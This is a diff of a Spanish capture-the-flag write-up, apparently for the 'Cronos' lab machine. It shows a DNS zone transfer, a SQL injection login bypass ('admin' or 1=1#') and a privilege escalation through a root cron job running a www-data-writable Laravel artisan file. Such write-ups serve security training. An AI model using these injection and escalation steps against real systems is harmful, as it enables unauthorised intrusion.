@@ -41,6 +41,7 @@ dig axfr @<IP> cronos.htb
 cronos.htb.       604800 IN A <IP>
 admin.cronos.htb. 604800 IN A <IP>
 www.cronos.htb.   604800 IN A <IP>
+ns1.cronos.htb.   604800 IN A <IP>
 ```
 
 ```bash
@@ -54,7 +55,7 @@ echo "<IP> cronos.htb admin.cronos.htb www.cronos.htb" | sudo tee -a /etc/hosts
 El login no sanea la consulta:
 
 ```text
-usuario: admin' or 1=1-- -
+usuario: admin' or 1=1#
 password: cualquiera
 ```
 
@@ -93,6 +94,11 @@ cat /etc/crontab; ls -l /var/www/laravel/artisan
 ```text
 * * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
 -rwxr-xr-x 1 www-data www-data 1646 artisan
+```
+
+```bash
+php artisan -V
+# Laravel Framework 5.4.17
 ```
 
 `artisan` es el punto de entrada de Laravel y es propiedad de `www-data` (755): el usuario de la web puede reescribirlo. Se le añade un payload al principio para que el cron de root lo ejecute cada minuto:
